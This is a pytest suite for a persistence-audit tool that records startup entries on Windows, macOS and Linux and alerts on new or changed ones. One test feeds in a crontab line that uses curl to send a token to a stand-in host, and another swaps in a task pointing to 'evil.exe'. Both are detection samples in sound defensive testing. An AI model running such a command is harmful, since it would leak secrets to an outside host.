# -*- coding: utf-8 -*-
"""Tests for persistence_audit.py. The operating-system queries are replaced with output in the real formats
(reg query, schtasks /fo csv /v, crontab -l, systemctl); the work list and baseline are real files in a temp folder."""
import json
import os
import platform
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import intent_store  # noqa: E402
import persistence_audit as pa  # noqa: E402

SECRET = "tok" + "en=ZXhhbXBsZXNlY3JldHZhbHVl1234"


@pytest.fixture(autouse=True)
def env(tmp_path, monkeypatch):
    logs = tmp_path / "logs"
    logs.mkdir()
    monkeypatch.setenv("HARNESS_ROOT", str(tmp_path))
    monkeypatch.setenv("HARNESS_LOGS", str(logs))
    monkeypatch.setattr(pa, "LOGS_DIR", logs)
    monkeypatch.setattr(pa, "BASELINE_PATH", logs / "persistence_baseline.json")
    monkeypatch.setattr(pa, "ALERTS_PATH", logs / "alerts.txt")
    monkeypatch.setattr(pa, "SENSOR_LAST_PATH", logs / "sensor_last.txt")
    return tmp_path


def set_entries(monkeypatch, entries):
    monkeypatch.setattr(pa, "collect_entries", lambda: list(entries))


def items(env):
    return [i for i in intent_store.read_jsonl("intents.jsonl", str(env / "logs")) if i["kind"] == "new_startup_entry"]


A = ("HKCU_Run", "OneDrive", '"C:\\Program Files\\OneDrive\\OneDrive.exe" /background')
B = ("ScheduledTask", "\\Backup", "C:\\tools\\backup.exe")


# ---------- reg query ----------
REG_OUT = (
    "\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n"
    "    OneDrive    REG_SZ    \"C:\\Program Files\\OneDrive\\OneDrive.exe\" /background\r\n"
    "    Adobe Reader Speed Launcher    REG_SZ    C:\\Adobe\\reader_sl.exe\r\n"
    "    Expander    REG_EXPAND_SZ    %ProgramFiles%\\x\\y.exe\r\n"
    "    (Default)    REG_SZ    \r\n\r\n"
)


def test_reg_query_names_with_spaces_values_with_quotes_and_the_header_line(monkeypatch):
    rows = pa.parse_reg_query(REG_OUT, r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run")
    assert rows == [("OneDrive", '"C:\\Program Files\\OneDrive\\OneDrive.exe" /background'), ("Adobe Reader Speed Launcher", "C:\\Adobe\\reader_sl.exe"),
                    ("Expander", "%ProgramFiles%\\x\\y.exe"), ("(Default)", "")]


def test_reg_query_of_an_empty_or_missing_key_gives_nothing(monkeypatch):
    assert pa.parse_reg_query("", "HKCU\\x") == []
    assert pa.parse_reg_query("ERROR: The system was unable to find the specified registry key or value.", "HKCU\\x") == []


def test_the_registry_check_asks_all_four_keys_and_skips_a_missing_one(monkeypatch):
    asked = []

    def fake(args):
        asked.append(args[2])
        return (1, "") if args[2].endswith("RunOnce") else (0, REG_OUT)

    monkeypatch.setattr(pa, "run", fake)
    entries = pa.check_windows_registry()
    assert len(asked) == 4 and {e[0] for e in entries} == {"HKCU_Run", "HKLM_Run"} and len(entries) == 8


def test_each_registry_key_gets_its_own_source_label(monkeypatch):
    monkeypatch.setattr(pa, "run", lambda args: (0, REG_OUT))
    entries = pa.check_windows_registry()
    assert {e[0] for e in entries} == {"HKCU_Run", "HKCU_RunOnce", "HKLM_Run", "HKLM_RunOnce"} and len(entries) == 16


# ---------- scheduled tasks (real column names) ----------
CSV = (
    '"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State"\n'
    '"PC","\\Backup","N/A","Ready","Interactive","N/A","0","Me","C:\\tools\\backup.exe","N/A","N/A","Enabled"\n'
    '"PC","\\Microsoft\\Windows\\Defrag\\ScheduledDefrag","N/A","Ready","Interactive","N/A","0","Microsoft Corporation","defrag.exe","N/A","N/A","Enabled"\n'
    '"PC","\\Old job","N/A","Disabled","Interactive","N/A","0","Me","C:\\old.exe","N/A","N/A","Disabled"\n'
    '"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State"\n'
    '"PC","\\Backup","N/A","Ready","Interactive","N/A","0","Me","C:\\tools\\backup.exe","N/A","N/A","Enabled"\n'
    '"PC","\\Vendor\\Updater","N/A","Ready","Interactive","N/A","0","Vendor","C:\\v\\up.exe -silent","N/A","N/A","Enabled"\n'
)


def test_scheduled_tasks_keep_enabled_non_microsoft_ones_once_and_ignore_repeated_headers():
    assert pa.parse_schtasks(CSV) == [("\\Backup", "C:\\tools\\backup.exe"), ("\\Backup", "C:\\tools\\backup.exe"), ("\\Vendor\\Updater", "C:\\v\\up.exe -silent")]
    assert pa.entries_to_dict([("ScheduledTask", n, c) for n, c in pa.parse_schtasks(CSV)]).keys() == {("ScheduledTask", "\\Backup"), ("ScheduledTask", "\\Vendor\\Updater")}


def test_a_failed_schtasks_query_gives_nothing(monkeypatch):
    monkeypatch.setattr(pa, "run", lambda a: (1, ""))
    assert pa.check_windows_scheduled_tasks() == []
    monkeypatch.setattr(pa, "run", lambda a: (0, CSV))
    assert [e[1] for e in pa.check_windows_scheduled_tasks()] == ["\\Backup", "\\Backup", "\\Vendor\\Updater"]


# ---------- folders and files ----------
def test_startup_folder_entries_carry_the_file_hash_and_skip_desktop_ini(env, monkeypatch):
    appdata = env / "AppData"
    folder = appdata / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    folder.mkdir(parents=True)
    (folder / "tool.lnk").write_bytes(b"one")
    (folder / "desktop.ini").write_text("[x]", encoding="utf-8")
    monkeypatch.setenv("APPDATA", str(appdata))
    monkeypatch.setenv("PROGRAMDATA", str(env / "nothing"))
    first = pa.check_windows_startup_folders()
    assert [(s, n) for s, n, _c in first] == [("Startup_User", "tool.lnk")] and "#" in first[0][2]
    (folder / "tool.lnk").write_bytes(b"two")
    assert pa.check_windows_startup_folders()[0][2] != first[0][2]


def test_macos_launch_agents(env, monkeypatch):
    agents = env / "Library" / "LaunchAgents"
    agents.mkdir(parents=True)
    (agents / "com.example.app.plist").write_bytes(b"<plist/>")
    (agents / "notes.txt").write_text("x", encoding="utf-8")
    monkeypatch.setenv("HOME", str(env))
    monkeypatch.setenv("USERPROFILE", str(env))
    got = [(s, n) for s, n, _c in pa.check_macos_launch_agents() if s == "LaunchAgent_User"]
    assert got == [("LaunchAgent_User", "com.example.app.plist")]


def test_linux_crontab_entries_are_named_by_their_text_not_their_position(monkeypatch):
    lines = "# a comment\n0 3 * * * /usr/bin/backup\n*/5 * * * * /usr/bin/ping-home\n"
    monkeypatch.setattr(pa, "run", lambda a: (0, lines))
    both = pa.check_linux_crontab()
    assert [e[2] for e in both] == ["/usr/bin/backup", "/usr/bin/ping-home"]
    monkeypatch.setattr(pa, "run", lambda a: (0, "*/5 * * * * /usr/bin/ping-home\n"))
    after_delete = pa.check_linux_crontab()
    assert after_delete[0] == both[1]


def test_linux_systemd_lists_only_enabled_units(monkeypatch):
    out = "a.service  enabled\nb.service  disabled\nc.timer  enabled  enabled\n"
    monkeypatch.setattr(pa, "run", lambda a: (0, out))
    assert [e[1] for e in pa.check_linux_systemd_user()] == ["a.service", "c.timer"]


def test_linux_autostart_desktop_files(env, monkeypatch):
    d = env / ".config" / "autostart"
    d.mkdir(parents=True)
    (d / "app.desktop").write_text("[Desktop Entry]", encoding="utf-8")
    (d / "readme").write_text("x", encoding="utf-8")
    monkeypatch.setenv("HOME", str(env))
    monkeypatch.setenv("USERPROFILE", str(env))
    assert [e[1] for e in pa.check_linux_autostart()] == ["app.desktop"]


# ---------- the comparison ----------
def test_diff_finds_new_and_changed_and_ignores_removed_and_same():
    base = {("S", "same"): "c", ("S", "gone"): "c", ("S", "edit"): "old"}
    cur = {("S", "same"): "c", ("S", "edit"): "new", ("S", "fresh"): "x"}
    new, changed = pa.diff(cur, base)
    assert new == [("S", "fresh", "x")] and changed == [("S", "edit", "new")]


def test_first_run_records_the_list_and_raises_nothing(env, monkeypatch, capsys):
    set_entries(monkeypatch, [A, B])
    r = pa.check()
    assert r["first_run"] and "[BASELINE_SET] 2 entries" in capsys.readouterr().out
    assert len(json.loads((env / "logs" / "persistence_baseline.json").read_text(encoding="utf-8"))["entries"]) == 2
    assert items(env) == [] and (env / "logs" / "sensor_last.txt").exists()


def test_an_unchanged_second_run_is_quiet(env, monkeypatch, capsys):
    set_entries(monkeypatch, [A, B])
    pa.check()
    capsys.readouterr()
    r = pa.check()
    assert r["new_entries"] == [] and r["changed_entries"] == [] and "[OK]" in capsys.readouterr().out and items(env) == []


def test_a_new_entry_raises_one_ask_first_item_and_one_alert(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, B])
    pa.check()
    rows = items(env)
    assert len(rows) == 1 and rows[0]["tier"] == 2 and rows[0]["value"] == 4 and rows[0]["shadow"] is False
    assert rows[0]["what"] == "new startup entry: ScheduledTask \\Backup"
    alert = (env / "logs" / "alerts.txt").read_text(encoding="utf-8").splitlines()
    assert len(alert) == 1 and alert[0].endswith("new startup entry: ScheduledTask \\Backup") and alert[0][:4].isdigit()


def test_two_new_entries_in_one_run_are_two_items(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, B, ("Crontab", "cron:abc", "/usr/bin/x")])
    pa.check()
    assert sorted(i["what"] for i in items(env)) == ["new startup entry: Crontab cron:abc", "new startup entry: ScheduledTask \\Backup"]
    assert len((env / "logs" / "alerts.txt").read_text(encoding="utf-8").splitlines()) == 2


def test_the_same_new_entry_does_not_alarm_again_on_the_next_run(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, B])
    pa.check()
    pa.check()
    pa.check()
    assert len(items(env)) == 1 and len((env / "logs" / "alerts.txt").read_text(encoding="utf-8").splitlines()) == 1


def test_a_changed_command_on_an_existing_entry_is_an_alarm(env, monkeypatch):
    set_entries(monkeypatch, [A, B])
    pa.check()
    set_entries(monkeypatch, [A, ("ScheduledTask", "\\Backup", "C:\\temp\\evil.exe")])
    r = pa.check()
    assert r["changed_entries"] == [("ScheduledTask", "\\Backup", "C:\\temp\\evil.exe")]
    assert [i["what"] for i in items(env)] == ["startup entry changed: ScheduledTask \\Backup"]


def test_a_removed_entry_is_not_an_alarm_and_may_come_back_as_new(env, monkeypatch):
    set_entries(monkeypatch, [A, B])
    pa.check()
    set_entries(monkeypatch, [A])
    pa.check()
    assert items(env) == []
    set_entries(monkeypatch, [A, B])
    pa.check()
    assert len(items(env)) == 1


def test_an_entry_that_leaves_and_returns_while_its_item_is_still_open_does_not_pile_up_a_second_item(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check()
    for entries in ([A, B], [A], [A, B]):
        set_entries(monkeypatch, entries)
        pa.check()
    assert len(items(env)) == 1 and len((env / "logs" / "alerts.txt").read_text(encoding="utf-8").splitlines()) == 1


def test_the_command_text_never_reaches_the_alert_or_the_work_list(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, ("Crontab", "cron:abc", "curl http://x/?%s" % SECRET)])
    pa.check()
    for name in os.listdir(env / "logs"):
        if name != "persistence_baseline.json":
            assert SECRET not in (env / "logs" / name).read_text(encoding="utf-8", errors="ignore")


def test_other_work_items_survive_an_alarm(env, monkeypatch):
    intent_store.write_intents([intent_store.new_intent("homework", "other thing", tier=1, value=3, dedupe="o")], str(env / "logs"))
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, B])
    pa.check()
    kinds = sorted(i["kind"] for i in intent_store.read_jsonl("intents.jsonl", str(env / "logs")))
    assert kinds == ["homework", "new_startup_entry"]


def test_dry_run_changes_nothing_at_all(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check(dry_run=True)
    assert os.listdir(env / "logs") == []                       # not even a first baseline
    pa.check()
    before = (env / "logs" / "persistence_baseline.json").read_text(encoding="utf-8")
    stamp = (env / "logs" / "sensor_last.txt").read_text(encoding="utf-8")
    set_entries(monkeypatch, [A, B])
    r = pa.check(dry_run=True)
    assert r["new_entries"] == [B] and items(env) == []
    assert (env / "logs" / "persistence_baseline.json").read_text(encoding="utf-8") == before
    assert (env / "logs" / "sensor_last.txt").read_text(encoding="utf-8") == stamp and not (env / "logs" / "alerts.txt").exists()


def test_rebaseline_accepts_the_current_list_silently(env, monkeypatch, capsys):
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, B])
    pa.check(rebaseline=True)
    assert "[REBASELINE]" in capsys.readouterr().out and items(env) == []
    assert pa.check()["new_entries"] == []


def test_a_damaged_baseline_file_is_replaced_not_crashed_on(env, monkeypatch):
    (env / "logs" / "persistence_baseline.json").write_text("{ nope", encoding="utf-8")
    set_entries(monkeypatch, [A])
    assert pa.check()["first_run"] is True
    assert json.loads((env / "logs" / "persistence_baseline.json").read_text(encoding="utf-8"))["entries"][0][1] == "OneDrive"


def test_unicode_names_and_commands(env, monkeypatch):
    set_entries(monkeypatch, [A])
    pa.check()
    set_entries(monkeypatch, [A, ("Startup_User", "café ☕.lnk", "C:\\Users\\Zoë\\x#abc")])
    pa.check()
    assert items(env)[0]["what"] == "new startup entry: Startup_User café ☕.lnk"


# ---------- platform dispatch and the command line ----------
def test_an_unsupported_system_says_so_and_exits_0(monkeypatch, capsys):
    monkeypatch.setattr(platform, "system", lambda: "Plan9")
    with pytest.raises(SystemExit) as e:
        pa.collect_entries()
    assert e.value.code == 0 and "not applicable on this system" in capsys.readouterr().out


@pytest.mark.parametrize("system,expected", [("Windows", {"win"}), ("Darwin", {"mac"}), ("Linux", {"lin"})])
def test_each_system_runs_only_its_own_checks(monkeypatch, system, expected):
    monkeypatch.setattr(platform, "system", lambda: system)
    for fn, tag in (("check_windows_registry", "win"), ("check_windows_startup_folders", "win"), ("check_windows_scheduled_tasks", "win"),
                    ("check_macos_launch_agents", "mac"), ("check_linux_crontab", "lin"), ("check_linux_autostart", "lin"), ("check_linux_systemd_user", "lin")):
        monkeypatch.setattr(pa, fn, lambda tag=tag: [("S", tag, "c")])
    assert {e[1] for e in pa.collect_entries()} == expected


def test_main_returns_0_and_passes_the_flags_on(env, monkeypatch):
    seen = {}
    monkeypatch.setattr(pa, "check", lambda rebaseline=False, dry_run=False: seen.update(rebaseline=rebaseline, dry_run=dry_run))
    assert pa.main(["--dry-run"]) == 0 and seen == {"rebaseline": False, "dry_run": True}
    assert pa.main(["--rebaseline"]) == 0 and seen == {"rebaseline": True, "dry_run": False}


def test_the_operating_system_door_survives_a_missing_program_and_a_timeout(monkeypatch):
    import subprocess
    assert pa.run(["definitely-not-a-real-program-xyz"])[0] == 127
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: (_ for _ in ()).throw(subprocess.TimeoutExpired("x", 1)))
    assert pa.run(["x"]) == (124, "")
